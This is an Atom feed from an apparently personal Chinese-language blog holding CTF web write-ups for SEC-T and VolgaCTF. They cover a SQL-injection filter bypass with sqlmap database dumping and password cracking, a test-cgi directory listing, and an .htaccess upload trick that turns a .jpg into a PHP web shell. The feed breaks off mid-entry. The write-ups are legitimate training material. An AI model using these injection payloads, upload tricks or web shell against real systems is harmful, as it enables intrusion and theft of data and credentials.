<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WhiteCat&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://andyw330.github.io/"/>
  <updated>2017-09-15T19:47:16.000Z</updated>
  <id>https://andyw330.github.io/</id>
  
  <author>
    <name>WhiteCat (andyw330)</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[SEC-T CTF] - Naughty ads (Web 200)</title>
    <link href="https://andyw330.github.io/2017/09/15/SEC-T-CTF-Naughty-ads-Web-200/"/>
    <id>https://andyw330.github.io/2017/09/15/SEC-T-CTF-Naughty-ads-Web-200/</id>
    <published>2017-09-15T15:56:00.000Z</published>
    <updated>2017-09-15T19:47:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”</p>
<p>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="external">http://naughtyads.alieni.se/</a></p>
<p>Author: avlidienbrunn</p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>直接試了 <code>robots.txt</code> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /admin</div><div class="line">Disallow: /*.phps</div></pre></td></tr></table></figure></p>
<p>看到 phps 感覺就是能拿到源碼，嘗試 index.phps 得到：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require_once</span> <span class="string">'lib.php'</span>;</div><div class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</div><div class="line">$cols = <span class="keyword">array</span>(</div><div class="line">    <span class="string">"e8c4-437b-9476"</span>,</div><div class="line">    <span class="string">"849e-416e-acf7"</span>,</div><div class="line">    <span class="string">"7f9d-470f-8698"</span>,</div><div class="line">    <span class="string">"c8bb-4695-93f7"</span>,</div><div class="line">    <span class="string">"5fbc-4729-8821"</span>,</div><div class="line">    <span class="string">"3ad3-46c3-b975"</span>,</div><div class="line">    <span class="string">"f44f-4cc9-a5e0"</span>,</div><div class="line">    <span class="string">"0c3f-42c8-a0ae"</span></div><div class="line">    );</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    $ad = get_ad($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="meta">?&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">HTML</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>NAUGHTY ADS ©1994<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BGCOLOR</span>=<span class="string">"WHITE"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">CENTER</span>&gt;</span></div><div class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $ad[<span class="string">'description'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">CENTER</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></div><div class="line">    <span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>NAUGHTY ADS ©1994<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BGCOLOR</span>=<span class="string">"WHITE"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">CENTER</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"ads"</span> <span class="attr">src</span>=<span class="string">"middle.png"</span> <span class="attr">width</span>=<span class="string">"800"</span> <span class="attr">height</span>=<span class="string">"600"</span> <span class="attr">usemap</span>=<span class="string">"#planetmap"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"planetmap"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"287,93,523,261"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"BDSM hookup"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"542,93,774,261"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Fat fetish"</span>&gt;</span></div><div class="line"></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"34,282,269,449"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Dirty mistress"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"292,282,521,449"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Femdom one night stand"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"545,282,777,449"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Waterboarding extasy"</span>&gt;</span></div><div class="line"></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"33,468,266,595"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Kinky nightmare"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"277,456,534,598"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Food fetish"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"547,466,780,599"</span> <span class="attr">href</span>=<span class="string">"?id=&lt;?php echo array_pop($cols); ?&gt;"</span> <span class="attr">alt</span>=<span class="string">"Whip experience"</span>&gt;</span></div><div class="line"></div><div class="line">              <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"595,23,619,57"</span> <span class="attr">href</span>=<span class="string">"/admin"</span> <span class="attr">alt</span>=<span class="string">"Admin"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">CENTER</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>看到<code>preg_match(&quot;/&#39;(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&#39;id&#39;])</code>有做 SQL injection 防護，原本一直在想要怎麼繞過，嘗試了一段時間都無法成功。</p>
<p>後來發現被檢查的是 <code>$_REQUEST[&#39;id&#39;]</code> ，但 SQL query 用的是 <code>$_GET[&#39;id&#39;]</code> ，因此只要同時發送<code>GET</code>跟<code>POST</code>資訊就行了。PHP預設是<code>$_REQUEST</code>會包含<code>$_GET</code>和<code>$_POST</code>，重複變數時會由<code>$_POST</code>蓋掉<code>$_GET</code>。</p>
<p>舉例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=%27%20or%201=1%20%23</div><div class="line">post data: id=a</div><div class="line">=&gt; $_GET[&apos;id&apos;] is &apos; or 1=1 #</div><div class="line">   $_POST[&apos;id&apos;] is a</div><div class="line">   $_REQUEST[&apos;id&apos;] is a</div></pre></td></tr></table></figure></p>
<p>結果確定可以成功繞過，然後因為很懶就直接交給 <code>sqlmap</code> 去撈資料了XD。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &apos;http://naughtyads.alieni.se/?id=0c3f-42c8-a0ae&apos; --data=&apos;id=a&apos; -v 3</div><div class="line"></div><div class="line">Parameter: id (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</div><div class="line">    Payload: id=0c3f-42c8-a0ae&apos; AND 3944=3944 AND &apos;nheG&apos;=&apos;nheG</div><div class="line">    Vector: AND [INFERENCE]</div><div class="line"></div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</div><div class="line">    Payload: id=0c3f-42c8-a0ae&apos; AND SLEEP(5) AND &apos;FJQU&apos;=&apos;FJQU</div><div class="line">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</div><div class="line"></div><div class="line">    Type: UNION query</div><div class="line">    Title: Generic UNION query (NULL) - 1 column</div><div class="line">    Payload: id=-3161&apos; UNION ALL SELECT CONCAT(0x71717a7171,0x515a526e724c4a684d5846564d4567624767585558445a57614654624e6e4c6248796772474b634c,0x716b717a71)-- EQgK</div><div class="line">    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &apos;http://naughtyads.alieni.se/?id=0c3f-42c8-a0ae&apos; --data=&apos;id=a&apos; -v 3 --dbs</div><div class="line"></div><div class="line">available databases [2]:</div><div class="line">[*] information_schema</div><div class="line">[*] naughty</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &apos;http://naughtyads.alieni.se/?id=0c3f-42c8-a0ae&apos; --data=&apos;id=a&apos; -v 3 -D naughty --tables</div><div class="line"></div><div class="line">Database: naughty</div><div class="line">[2 tables]</div><div class="line">+-------+</div><div class="line">| ads   |</div><div class="line">| login |</div><div class="line">+-------+</div></pre></td></tr></table></figure>
<p>看到 login ，想到先前在 <code>robots.txt</code> 看到的，有 admin 的頁面可以登入。把 login table 的資料 dump 出來，發現 password 是經過 <code>md5</code> hash 的，可以直接用 sqlmap 的字典檔解解看，或是直接上網查。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &apos;http://naughtyads.alieni.se/?id=0c3f-42c8-a0ae&apos; --data=&apos;id=a&apos; -v 3 -D naughty -T login --dump</div><div class="line"></div><div class="line">[00:33:36] [INFO] analyzing table dump for possible password hashes</div><div class="line">[00:33:36] [INFO] recognized possible password hashes in column &apos;password&apos;</div><div class="line">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]</div><div class="line">do you want to crack them via a dictionary-based attack? [Y/n/q]</div><div class="line">[00:33:54] [INFO] using hash method &apos;md5_generic_passwd&apos;</div><div class="line">what dictionary do you want to use?</div><div class="line">[1] default dictionary file &apos;/usr/local/Cellar/sqlmap/1.1.8/libexec/txt/wordlist.zip&apos; (press Enter)</div><div class="line">[2] custom dictionary file</div><div class="line">[3] file with list of dictionary files</div><div class="line">&gt;</div><div class="line">[00:34:01] [INFO] using default dictionary</div><div class="line">do you want to use common password suffixes? (slow!) [y/N]</div><div class="line">[00:34:02] [INFO] starting dictionary-based cracking (md5_generic_passwd)</div><div class="line">[00:34:02] [INFO] starting 4 processes</div><div class="line">[00:34:15] [INFO] cracked password &apos;secret&apos; for hash &apos;5ebe2294ecd0e0f08eab7690d2a6ee69&apos;</div><div class="line">[00:34:17] [INFO] postprocessing table dump</div><div class="line">Database: naughty</div><div class="line">Table: login</div><div class="line">[1 entry]</div><div class="line">+----+---------------------+-------------------------------------------+</div><div class="line">| id | name                | password                                  |</div><div class="line">+----+---------------------+-------------------------------------------+</div><div class="line">| 1  | webmasterofdoom3755 | 5ebe2294ecd0e0f08eab7690d2a6ee69 (secret) |</div><div class="line">+----+---------------------+-------------------------------------------+</div></pre></td></tr></table></figure>
<p>用帳號 <code>webmasterofdoom3755</code> 密碼 <code>secret</code> 登入 <a href="http://naughtyads.alieni.se/admin/" target="_blank" rel="external">http://naughtyads.alieni.se/admin/</a></p>
<p>登入後看到一個上傳表單，上傳欄位有電話、敘述跟圖檔。剛看到時卡住了一下，後來看到 HTML 原始碼裡有貼心提示XD。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>ADMINISTRATIVE AREA<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">FORM</span> <span class="attr">ACTION</span>=<span class="string">""</span> <span class="attr">METHOD</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line">            Phone number: <span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">"TEXT"</span> <span class="attr">NAME</span>=<span class="string">"phone"</span> <span class="attr">PLACEHOLDER</span>=<span class="string">"#"</span>/&gt;</span><span class="tag">&lt;<span class="name">BR</span> /&gt;</span></div><div class="line">            Description: <span class="tag">&lt;<span class="name">TEXTAREA</span> <span class="attr">NAME</span>=<span class="string">"description"</span>&gt;</span><span class="tag">&lt;/<span class="name">TEXTAREA</span>&gt;</span><span class="tag">&lt;/<span class="name">BR</span> /&gt;</span></div><div class="line">            Image: <span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">"FILE"</span> <span class="attr">NAME</span>=<span class="string">"image"</span> /&gt;</span><span class="tag">&lt;<span class="name">BR</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">"SUBMIT"</span> <span class="attr">NAME</span>=<span class="string">"image"</span> <span class="attr">value</span>=<span class="string">"upload"</span> /&gt;</span><span class="tag">&lt;<span class="name">BR</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!-- Stuck? Read challenge description again... --&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>把電話欄位填 <code>555-31338</code> 後按上傳就能拿到 flag 了。</p>
<p>Flag: <code>SECT{~tr4nsv3stiT3s_w3lc0me_t00~}</code></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>現實上很多問題都出在程式前後不一致的地方呢，看來在開發的時候真的要很小心啊！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Can you put agent Gill in the naughty ad section? His phone number is “555-31338”&lt;/p&gt;
&lt;p&gt;Service: &lt;a href=&quot;http://naughtyads.alieni.se/&quot;&gt;http://naughtyads.alieni.se/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Author: avlidienbrunn&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
      <category term="SQL injection" scheme="https://andyw330.github.io/tags/SQL-injection/"/>
    
      <category term="SEC-T CTF" scheme="https://andyw330.github.io/tags/SEC-T-CTF/"/>
    
  </entry>
  
  <entry>
    <title>[SEC-T CTF] - Sprinkler system (Web 100)</title>
    <link href="https://andyw330.github.io/2017/09/15/SEC-T-CTF-Sprinkler-system-Web-100/"/>
    <id>https://andyw330.github.io/2017/09/15/SEC-T-CTF-Sprinkler-system-Web-100/</id>
    <published>2017-09-15T15:26:00.000Z</published>
    <updated>2017-09-15T19:34:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!</p>
<p>Service: <a href="http://sprinklers.alieni.se/" target="_blank" rel="external">http://sprinklers.alieni.se/</a></p>
<p>Author: avlidienbrunn</p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>直接試了 robots.txt 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /cgi-bin/test-cgi</div></pre></td></tr></table></figure></p>
<p>連上 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi</a> 會拿到以下資訊：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">CGI/1.0 test script report:</div><div class="line"></div><div class="line">argc is 0. argv is .</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/test-cgi</div><div class="line">QUERY_STRING =</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = x.x.x.x</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH =</div></pre></td></tr></table></figure></p>
<p>查了一下 test-cgi vulnerability ，找到其有 directory listings 的問題（參考：<a href="http://insecure.org/sploits/test-cgi.html" target="_blank" rel="external">這篇</a>）。在網址 query 加上<code>*</code>可以在<code>QUERY_STRING</code>看到目前資料夾路徑下的所有檔案與資料夾名稱。</p>
<p><a href="http://sprinklers.alieni.se/cgi-bin/test-cgi?*" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi?*</a><br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">QUERY_STRING</span> = enable_sprinkler_system test-cgi</div></pre></td></tr></table></figure></p>
<p>連上 <a href="http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system</a> 即可拿到 flag 。</p>
<p>Flag: <code>SECT{-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!&lt;/p&gt;
&lt;p&gt;Service: &lt;a href=&quot;http://sprinklers.alieni.se/&quot;&gt;http://sprinklers.alieni.se/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Author: avlidienbrunn&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
      <category term="SEC-T CTF" scheme="https://andyw330.github.io/tags/SEC-T-CTF/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - Share Point 200</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/</id>
    <published>2017-03-31T13:08:00.000Z</published>
    <updated>2017-03-31T14:47:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Web<br>Point: 200<br>Description:<br>Look! I wrote a good service for sharing your files with your friends, enjoy)<br>share-point.quals.2017.volgactf.ru</p>
<p><strong>Hints</strong></p>
<ol>
<li>flag’s location is <strong>opt</strong>imal</li>
</ol>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這個網站可以讓人上傳檔案到自己帳號，還可以把檔案分享給另一個帳號。我們可以決定要不要收被分享的檔案，收了就會把該檔案加進自己帳號的檔案夾內。上傳檔案的部分會把<code>.php</code>, <code>.html</code>副檔名的檔案擋掉。<br>檔案資料夾路徑：<code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/&lt;檔案名稱&gt;</code></p>
<p>這題卡了很久，一直在找share功能是不是有能exploit的方法，試到最後只知道能把server上的檔案 (Ex: <code>../../index.php</code>) share給其他帳號。可是php檔案會被直接執行，所以也拿不到source code，也試了下拿<code>.htaccess</code>，可是讀取會得到status 403，然後就沒有然後了… QAQ</p>
<p>賽後才找到了方法，正解是我們可以上傳<code>.htaccess</code>檔案，稍微參考了一下DigitalOcean的 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file" target="_blank" rel="external">How To Use the .htaccess File</a>，還有這篇 <a href="https://www.php5.idv.tw/html.php?mod=article&amp;do=show&amp;shid=39" target="_blank" rel="external">[設定] PHP安裝之後APACHE之設定</a>，顯示我們可以用<code>AddType</code>來讓不同副檔名的檔案當作php來執行。</p>
<p>在<code>.htaccess</code>裡寫下這行：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</div></pre></td></tr></table></figure></p>
<p>上傳到網站上，路徑會是 <code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/.htaccess</code>，這就表示在我們帳號下資料夾內的<code>jpg</code>檔案能當<code>php</code>執行了！！！</p>
<p>再來建個<code>shell.jpg</code>，裡面放php shell code：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> system($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>上傳！大功告成！<br>可以先用 locate 找 flag 的位置：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://share-point.quals<span class="number">.2017</span>.volgactf.ru/<span class="built_in">files</span>/&lt;帳號名稱&gt;/<span class="built_in">shell</span>.jpg?cmd=locate flag</div></pre></td></tr></table></figure></p>
<p>找到flag的位置在 <code>/opt/flag.txt</code>，最後就是cat出來啦<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.<span class="number">2017</span>.volgactf.<span class="keyword">ru</span>/<span class="keyword">files</span>/&lt;帳號名稱&gt;/<span class="keyword">shell</span>.jpg?cmd=<span class="keyword">cat</span> /<span class="keyword">opt</span>/flag.txt</div></pre></td></tr></table></figure></p>
<p>Flag: <code>VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Web&lt;br&gt;Point: 200&lt;br&gt;Description:&lt;br&gt;Look! I wrote a good service for sharing your files with your friends, enjoy)&lt;br&gt;share-point.quals.2017.volgactf.ru&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
